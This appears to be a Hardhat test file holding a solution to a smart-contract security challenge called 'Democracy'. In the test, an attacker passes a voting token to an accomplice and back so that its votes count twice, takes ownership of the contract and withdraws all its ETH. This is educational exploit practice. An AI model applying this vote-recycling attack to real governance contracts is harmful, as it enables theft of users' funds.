const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet, accompliceWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract, attackerWallet, accompliceWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet, accompliceWallet;
        before(async function () {
            ({ victimContract, attackerWallet, accompliceWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            // nominate challenger and give token 1 to accomplice eoa
            await victimContract.nominateChallenger(attackerWallet.address);
            await victimContract
                .connect(attackerWallet)
                .transferFrom(attackerWallet.address, accompliceWallet.address, 1);

            // accomplice casts vote and sends token back to attacker
            // attacker didn't vote yet but now will vote will add his token balance putting
            // check over the edge in _callElection()
            await victimContract.connect(accompliceWallet).vote(attackerWallet.address);
            await victimContract
                .connect(accompliceWallet)
                .transferFrom(accompliceWallet.address, attackerWallet.address, 1);

            // attacker votes & takes ownership of contract then takes eth from contract
            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
